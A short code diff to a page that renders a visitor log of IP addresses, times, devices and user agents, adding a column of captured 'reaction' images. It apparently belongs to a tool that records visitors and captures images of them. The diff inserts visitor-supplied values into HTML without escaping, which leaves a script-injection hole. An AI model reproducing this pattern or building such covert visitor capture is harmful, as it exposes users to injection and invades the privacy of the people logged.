@@ -481,12 +481,17 @@
         const d = new Date(l.timestamp);
         const time = d.toLocaleString();
         const device = parseDevice(l.userAgent);
+        const reactionHtml = l.reaction 
+          ? `<a href="${l.reaction}" target="_blank"><img src="${l.reaction}" style="width:50px;height:50px;border-radius:6px;border:1px solid #7c4dff;object-fit:cover;"></a>`
+          : '<span style="color:#444;">No capture</span>';
+
         return `
         <tr>
           <td style="color:#555;font-size:.75rem;">#${i + 1}</td>
           <td class="ip">${l.ip}</td>
           <td class="time">${time}</td>
           <td style="color:#e0e0f0;">${device}</td>
+          <td>${reactionHtml}</td>
           <td class="ua">${l.userAgent}</td>
         </tr>`;
       }).join('');
@@ -499,6 +504,7 @@
             <th>IP Address</th>
             <th>Time</th>
             <th>Device</th>
+            <th>Reaction</th>
             <th>User Agent</th>
           </tr>
         </thead>
